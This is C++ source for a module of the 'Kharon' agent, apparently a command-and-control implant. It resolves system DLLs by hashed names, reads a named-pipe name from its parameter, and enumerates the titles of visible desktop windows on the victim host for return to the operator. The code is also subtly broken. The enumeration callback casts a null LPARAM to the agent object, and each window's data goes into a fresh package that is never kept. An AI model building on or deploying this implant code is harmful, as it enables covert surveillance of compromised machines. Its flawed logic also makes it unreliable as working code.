#include <Kharon.h>

using namespace Root;

EXTERN_C DECLFN auto Main(
    _In_ UPTR Parameter
) -> VOID {
    Kharon Kh;

    Package   KhPackage( &Kh );
    Parser    KhParser( &Kh );

    Kh.Init( (PBYTE)Parameter );

    Kh.InitPackage( &KhPackage );
    Kh.InitParser( &KhParser );

    Kh.Start( Parameter );

    return;
}

auto DECLFN Kharon::Init(
    _In_ PBYTE Parameter
) -> void {
    PARSER Parser = { 0 };

    ULONG  PipeLen = 0;

    Psr->New( &Parser, Parameter );

    Ctx.PipeName = Psr->GetStr( &Parser, &PipeLen );

    /* ========= [ init modules and funcs ] ========= */
    Ntdll.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );
    User32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
    Krnl32.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );

    RSL_IMP( Ntdll  );
    RSL_IMP( User32 );
    RSL_IMP( Krnl32 );

    KhDbgz( "library kernel32.dll loaded at %p and functions resolveds", Krnl32.Handle );
    KhDbgz( "library ntdll.dll    loaded at %p and functions resolveds", Ntdll.Handle  );
    KhDbgz( "library User32.dll   loaded at %p and functions resolveds", User32.Handle );

    return;
}

auto Kharon::EnumWinProc(
    _In_ HWND   WinHandle, 
    _In_ LPARAM Parameter
) -> BOOL {
    PPACKAGE Package           = Pkg->New();
    CHAR     WinName[MAX_PATH] = { 0 };
    ULONG    NameLength        = 0;

    NameLength = User32.GetWindowTextA(WinHandle, WinName, sizeof( WinName ) );

    if ( WinName[0] != 0 && NameLength && User32.IsWindowVisible( WinHandle ) ) {
        Pkg->AddString(Package, WinName);
    }

    return TRUE;
}

auto CALLBACK Kharon::StaticEnumWinProc( 
    _In_ HWND   WinHandle, 
    _In_ LPARAM Parameter
) -> BOOL {
    Kharon* pThis = reinterpret_cast<Kharon*>( Parameter );

    return pThis->EnumWinProc(WinHandle, Parameter);
}

auto DECLFN Kharon::Start(
    _In_ UPTR Argument
) -> VOID {
    User32.EnumDesktopWindows( 0, StaticEnumWinProc, (LPARAM)0 );
}